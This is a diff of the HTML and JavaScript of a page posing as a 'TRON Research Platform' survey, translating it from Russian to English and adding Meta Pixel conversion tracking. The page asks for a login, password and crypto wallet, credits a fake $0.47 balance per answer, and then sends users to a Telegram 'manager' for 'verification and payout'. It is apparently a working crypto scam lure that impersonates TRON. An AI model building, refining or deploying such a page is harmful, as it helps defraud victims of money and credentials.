@@ -1,9 +1,29 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>TRON Research Platform</title>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f.fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1566610124578100');
+fbq('track', 'PageView');
+</script>
+<noscript>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1566610124578100&ev=PageView&noscript=1"/>
+</noscript>
+<!-- End Meta Pixel Code -->
+
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
 :root {
@@ -18,33 +38,32 @@ h1{font-size:24px;font-weight:600;margin:0 0 6px;text-align:center;color:var(--a
 .section{display:flex;flex-direction:column;gap:10px;}
 button{width:100%;padding:12px;border-radius:12px;border:none;font-size:14px;font-weight:500;cursor:pointer;background:var(--accent);color:#fff;transition:background 0.2s ease;}
 button:hover{background:#3f5bcc;}
-button.support{background:#28a745;color:#fff;margin-top:10px;}
+button.support{background:#28a745;}
 button.support:hover{background:#1e7e34;}
 input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px solid var(--border);color:var(--text);font-size:14px;}
-.footer{margin-top:12px;font-size:11px;color:#6f7480;line-height:1.4;text-align:center;}
-.toast{position:absolute;top:10px;left:50%;transform:translateX(-50%);background:var(--accent);color:#fff;padding:8px 14px;border-radius:10px;font-size:13px;font-weight:500;opacity:0;pointer-events:none;transition:.3s;}
-.toast.show{opacity:1;top:20px;}
+.footer{margin-top:12px;font-size:11px;color:#6f7480;text-align:center;}
 .progress-bar{width:100%;height:12px;background:rgba(255,255,255,0.1);border-radius:12px;overflow:hidden;}
-#progress{width:0%;height:100%;background:var(--accent);border-radius:12px;transition:width 0.3s ease;}
+#progress{width:0%;height:100%;background:var(--accent);border-radius:12px;}
 .question-card{background:linear-gradient(180deg,#141826,#12151b);border-radius:16px;padding:16px;display:flex;flex-direction:column;gap:12px;}
-.question-card h2{font-size:18px;font-weight:500;color:#fff;margin:0;text-align:center;}
-.answer-btn{padding:12px;border-radius:12px;border:none;font-size:14px;font-weight:500;cursor:pointer;background:var(--accent);color:#fff;transition:0.2s;}
-.answer-btn:hover{background:#3f5bcc;}
+.question-card h2{text-align:center;font-size:18px;}
 </style>
 </head>
+
 <body>
 <div class="app">
   <div class="card">
-    <div class="toast" id="toast"></div>
-    <h1 id="title-text">Professional TRON Questions</h1>
-    <div class="balance" id="balance-display">Баланс: $0.00</div>
 
-    <!-- Registration -->
+    <h1>Professional TRON Questions</h1>
+    <div class="balance" id="balance-display">Balance: $0.00</div>
+
+    <!-- Register -->
     <div id="register-screen" class="section">
-      <input type="text" id="login" placeholder="Логин">
-      <input type="password" id="password" placeholder="Пароль">
-      <input type="text" id="wallet" placeholder="USDT TRC20 Ваш кошелёк">
-      <button id="start-btn">Начать опрос</button>
+      <input type="text" id="login" placeholder="Login">
+      <input type="password" id="password" placeholder="Password">
+      <input type="text" id="wallet" placeholder="USDT TRC20 Wallet">
+      <button id="start-btn" disabled style="opacity:.5;cursor:not-allowed;">
+        Start Survey
+      </button>
     </div>
 
     <!-- Quiz -->
@@ -52,146 +71,128 @@ input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px s
       <div class="progress-bar"><div id="progress"></div></div>
       <div class="question-card">
         <h2 id="question-text"></h2>
-        <div class="section">
-          <button class="answer-btn" data-value="yes" id="yes-btn">Да</button>
-          <button class="answer-btn" data-value="no" id="no-btn">Нет</button>
-          <button class="answer-btn" data-value="dontknow" id="dontknow-btn">Затрудняюсь ответить</button>
-        </div>
+        <button class="answer-btn">Yes</button>
+        <button class="answer-btn">No</button>
+        <button class="answer-btn">I don't know</button>
       </div>
     </div>
 
-    <!-- End Screen -->
+    <!-- End -->
     <div id="end-screen" class="section" style="display:none;">
-      <h1 id="thanks-text">Спасибо за участие!</h1>
+      <h1>Thank you for participating !</h1>
       <p id="final-login-text"></p>
       <p id="final-wallet-text"></p>
       <p id="final-balance-text"></p>
-      <p>Для верификации, чтобы получить деньги, свяжитесь с менеджером.</p>
-      <p>Сделайте скриншот для менеджера.</p>
-      <button class="support" onclick="window.open('https://t.me/VoluntaryVaultSupport','_blank')" id="manager-btn">Связаться с менеджером</button>
+      <p>For verification and payout, please contact the manager.</p>
+      <p>Please take a screenshot for the manager.</p>
+      <button class="support" onclick="window.open('https://t.me/VoluntaryVaultSupport','_blank')">
+        Contact Manager
+      </button>
     </div>
 
     <div class="footer">
-      © 2019-2026. Все права защищены. TRON
+      © 2019–2026 All rights reserved TRON
     </div>
+
   </div>
 </div>
 
 <script>
-// === Мультиязычность ===
-const texts = {
-  "ru": {startBtn:"Начать опрос",yes:"Да",no:"Нет",dontknow:"Затрудняюсь ответить",title:"Professional TRON Questions",balance:"Баланс: $",thanks:"Спасибо за участие!",login:"Логин: ",wallet:"Кошелек: ",earned:"Заработано: $",manager:"Связаться с менеджером"},
-  "en": {startBtn:"Start Survey",yes:"Yes",no:"No",dontknow:"I don't know",title:"Professional TRON Questions",balance:"Balance: $",thanks:"Thank you for participating!",login:"Login: ",wallet:"Wallet: ",earned:"Earned: $",manager:"Contact Manager"},
-  "fr": {startBtn:"Commencer le sondage",yes:"Oui",no:"Non",dontknow:"Je ne sais pas",title:"Professional TRON Questions",balance:"Solde: $",thanks:"Merci pour votre participation!",login:"Login: ",wallet:"Portefeuille: ",earned:"Gagné: $",manager:"Contacter le manager"},
-  "de": {startBtn:"Umfrage starten",yes:"Ja",no:"Nein",dontknow:"Weiß nicht",title:"Professional TRON Questions",balance:"Kontostand: $",thanks:"Danke für die Teilnahme!",login:"Login: ",wallet:"Wallet: ",earned:"Verdient: $",manager:"Manager kontaktieren"},
-  "es": {startBtn:"Iniciar encuesta",yes:"Sí",no:"No",dontknow:"No sé",title:"Professional TRON Questions",balance:"Saldo: $",thanks:"¡Gracias por participar!",login:"Login: ",wallet:"Cartera: ",earned:"Ganado: $",manager:"Contactar al gerente"},
-  "it": {startBtn:"Inizia sondaggio",yes:"Sì",no:"No",dontknow:"Non so",title:"Professional TRON Questions",balance:"Saldo: $",thanks:"Grazie per la partecipazione!",login:"Login: ",wallet:"Portafoglio: ",earned:"Guadagnato: $",manager:"Contatta il manager"},
-  "pl": {startBtn:"Rozpocznij ankietę",yes:"Tak",no:"Nie",dontknow:"Nie wiem",title:"Professional TRON Questions",balance:"Saldo: $",thanks:"Dziękujemy za udział!",login:"Login: ",wallet:"Portfel: ",earned:"Zarobione: $",manager:"Skontaktuj się z menedżerem"},
-  "zh": {startBtn:"开始调查",yes:"是",no:"否",dontknow:"不知道",title:"Professional TRON Questions",balance:"余额: $",thanks:"感谢参与！",login:"登录: ",wallet:"钱包: ",earned:"赚取: $",manager:"联系经理"},
-  "ja": {startBtn:"アンケートを開始",yes:"はい",no:"いいえ",dontknow:"わかりません",title:"Professional TRON Questions",balance:"残高: $",thanks:"ご参加ありがとうございます！",login:"ログイン: ",wallet:"ウォレット: ",earned:"獲得: $",manager:"マネージャーに連絡"},
-  "ko": {startBtn:"설문 시작",yes:"예",no:"아니요",dontknow:"모르겠습니다",title:"Professional TRON Questions",balance:"잔액: $",thanks:"참여해주셔서 감사합니다!",login:"로그인: ",wallet:"지갑: ",earned:"획득: $",manager:"매니저에게 연락"},
-  "hi": {startBtn:"सर्वेक्षण शुरू करें",yes:"हाँ",no:"नहीं",dontknow:"मुझे नहीं पता",title:"Professional TRON Questions",balance:"संतुलन: $",thanks:"भाग लेने के लिए धन्यवाद!",login:"लॉगिन: ",wallet:"वॉलेट: ",earned:"कमाया: $",manager:"मैनेजर से संपर्क करें"}
-};
-
-// === язык пользователя
-let userLang = navigator.language || navigator.userLanguage; // получаем язык устройства
-let langCode = userLang.split('-')[0]; // берём только первую часть: en, ru, zh и т.д.
-if(!texts[langCode]) langCode = 'en'; // если языка нет в объекте texts, ставим английский по умолчанию
-let lang = langCode;
-
-// элементы
-const registerScreen=document.getElementById('register-screen');
-const quizScreen=document.getElementById('quiz-screen');
-const endScreen=document.getElementById('end-screen');
-const questionText=document.getElementById('question-text');
-const balanceDisplay=document.getElementById('balance-display');
-const progressBar=document.getElementById('progress');
-const finalLogin=document.getElementById('final-login-text');
-const finalWallet=document.getElementById('final-wallet-text');
-const finalBalance=document.getElementById('final-balance-text');
-
-const startBtn=document.getElementById('start-btn');
-const yesBtn=document.getElementById('yes-btn');
-const noBtn=document.getElementById('no-btn');
-const dontknowBtn=document.getElementById('dontknow-btn');
-
-function showToast(msg){const t=document.getElementById('toast');t.innerText=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000);}
-
-// 34 вопроса
-const questions=[
-"Вы используете TronLink регулярно ?",
-"Вы когда-либо подключали TronLink к dApp ?",
-"Вы знаете разницу между TRC10 и TRC20 токенами ?",
-"Вы теряли доступ к своему TRON кошельку ?",
-"Вы используете аппаратные кошельки для хранения TRX ?",
-"Вы считаете, что комиссия в сети TRON низкая ?",
-"Вы знали, что TRON поддерживает смарт-контракты EVM ?",
-"Вы когда-либо делали транзакции через TronScan ?",
-"Вы понимаете, что такое TRON Power ?",
-"Вы знаете о возможности заморозки TRX для получения SR голосов ?",
-"Вы когда-либо участвовали в голосовании Super Representative ?",
-"Вы знаете, что такое TRON DAO ?",
-"Вы знаете о TRC-721 NFT на TRON ?",
-"Вы используете TronLink для хранения токенов TRC20 ?",
-"Вы когда-либо обменивали токены TRON на бирже ?",
-"Вы понимаете риски хранения приватных ключей онлайн ?",
-"Вы знаете о TronGrid API ?",
-"Вы когда-либо создавали TRON dApp ?",
-"Вы знакомы с системой TRON Energy ?",
-"Вы понимаете разницу между MainNet и TestNet ?",
-"Вы знаете о TRON SR Rewards ?",
-"Вы используете мобильное приложение TronLink ?",
-"Вы понимаете работу смарт-контрактов TRON ?",
-"Вы знаете о TRON WalletConnect ?",
-"Вы участвовали в тестовой сети TRON ?",
-"Вы понимаете понятие Staking в TRON ?",
-"Вы знаете о TRON Voting Power ?",
-"Вы использовали dApp с TRON токенами ?",
-"Вы знаете, что такое TRON Governance ?",
-"Вы знаете, как защитить кошелек от фишинга ?",
-"Вы понимаете работу TRON токенов в DeFi ?",
-"Вы знаете о TRON Cross-Chain возможностях ?",
-"Вы участвовали в Airdrop TRON токенов ?",
-"Вы понимаете разницу между Cold и Hot wallet ?",
-"Вы знаете, как проверить транзакции TRON на TronScan ?"
+const questions = [
+"Do you regularly use TronLink ?",
+"Have you ever connected TronLink to a dApp ?",
+"Do you know the difference between TRC10 and TRC20 tokens ?",
+"Have you ever lost access to your TRON wallet ?",
+"Do you use hardware wallets to store TRX ?",
+"Do you think transaction fees on TRON are low ?",
+"Did you know that TRON supports smart contracts ?",
+"Have you ever made transactions using TronScan ?",
+"Do you understand what TRON Energy is ?",
+"Do you know about freezing TRX to receive voting power ?",
+"Have you ever participated in Super Representative voting ?",
+"Do you know what TRON DAO is ?",
+"Are you familiar with TRC-721 NFTs on TRON ?",
+"Do you use TronLink to store TRC20 tokens ?",
+"Have you ever traded TRON tokens on an exchange ?",
+"Do you understand the risks of storing private keys online ?",
+"Do you know about the TronGrid API ?",
+"Have you ever created a TRON dApp ?",
+"Are you familiar with the TRON Energy system ?",
+"Do you understand the difference between MainNet and TestNet ?",
+"Do you know about TRON Super Representative rewards ?",
+"Do you use the TronLink mobile application ?",
+"Do you understand how TRON smart contracts work ?",
+"Do you know about TRON WalletConnect ?",
+"Have you ever participated in the TRON test network ?",
+"Do you understand the concept of staking in TRON ?",
+"Do you know what TRON voting power is ?",
+"Have you used dApps with TRON-based tokens ?",
+"Do you know what TRON governance is ?",
+"Do you know how to protect your wallet from phishing ?",
+"Do you understand how TRON tokens work in DeFi ?",
+"Do you know about TRON Cross-Chain capabilities ?",
+"Have you ever participated in TRON token airdrops ?",
+"Do you understand the difference between Cold and Hot Wallets ?"
 ];
 
-let currentIndex=0;
-let balance=0;
-let answers=[];
+let i=0, balance=0;
 
-function updateProgress(){progressBar.style.width=((currentIndex)/questions.length*100)+'%';}
-function updateBalance(){balanceDisplay.textContent=texts[lang].balance + balance.toFixed(2);}
-function showQuestion(){if(currentIndex>=questions.length){showEndScreen();return;}questionText.textContent=questions[currentIndex];updateProgress();updateBalance();}
-function showEndScreen(){
-  quizScreen.style.display='none';
-  endScreen.style.display='flex';
-  finalLogin.textContent=texts[lang].login + localStorage.getItem('login');
-  finalWallet.textContent=texts[lang].wallet + localStorage.getItem('wallet');
-  finalBalance.textContent=texts[lang].earned + balance.toFixed(2);
-}
+const q=document.getElementById("question-text");
+const bal=document.getElementById("balance-display");
+const prog=document.getElementById("progress");
 
-// --- Старт кнопка
-startBtn.addEventListener('click',()=>{
-  const login=document.getElementById('login').value.trim();
-  const password=document.getElementById('password').value.trim();
-  const wallet=document.getElementById('wallet').value.trim();
-  if(!login||!password||!wallet){showToast('Заполните все поля!');return;}
-  localStorage.setItem('login',login);
-  localStorage.setItem('password',password);
-  localStorage.setItem('wallet',wallet);
-  registerScreen.style.display='none';
-  quizScreen.style.display='flex';
-  showQuestion();
+document.getElementById("start-btn").onclick=()=>{
+  fbq('track','Lead');
+  document.getElementById("register-screen").style.display="none";
+  document.getElementById("quiz-screen").style.display="flex";
+  q.innerText=questions[i];
+};
+
+document.querySelectorAll(".answer-btn").forEach(b=>{
+  b.onclick=()=>{
+    balance+=0.47;
+    i++;
+    bal.innerText="Balance: $"+balance.toFixed(2);
+    prog.style.width=(i/questions.length*100)+"%";
+    if(i>=questions.length){
+      fbq('track','CompleteRegistration',{value:balance,currency:'USD'});
+      document.getElementById("quiz-screen").style.display="none";
+      document.getElementById("end-screen").style.display="flex";
+      document.getElementById("final-login-text").innerText="Login: "+login.value;
+      document.getElementById("final-wallet-text").innerText="Wallet: "+wallet.value;
+      document.getElementById("final-balance-text").innerText="Earned: $"+balance.toFixed(2);
+    } else {
+      q.innerText=questions[i];
+    }
+  }
 });
 
-// --- Ответы
-[yesBtn,noBtn,dontknowBtn].forEach(btn=>{btn.addEventListener('click',()=>{
-  answers[currentIndex]=btn.getAttribute('data-value');
-  balance+=0.47;
-  currentIndex++;
-  showQuestion();
-})});
+/* ===== ДОБАВЛЕНА ТОЛЬКО ПРОВЕРКА ПОЛЕЙ ===== */
+const loginInput = document.getElementById("login");
+const passwordInput = document.getElementById("password");
+const walletInput = document.getElementById("wallet");
+const startBtn = document.getElementById("start-btn");
+
+function checkInputs() {
+  if (
+    loginInput.value.trim() !== "" &&
+    passwordInput.value.trim() !== "" &&
+    walletInput.value.trim() !== ""
+  ) {
+    startBtn.disabled = false;
+    startBtn.style.opacity = "1";
+    startBtn.style.cursor = "pointer";
+  } else {
+    startBtn.disabled = true;
+    startBtn.style.opacity = ".5";
+    startBtn.style.cursor = "not-allowed";
+  }
+}
+
+loginInput.addEventListener("input", checkInputs);
+passwordInput.addEventListener("input", checkInputs);
+walletInput.addEventListener("input", checkInputs);
+/* ===== КОНЕЦ ДОБАВЛЕНИЯ ===== */
 </script>
 </body>
 </html>
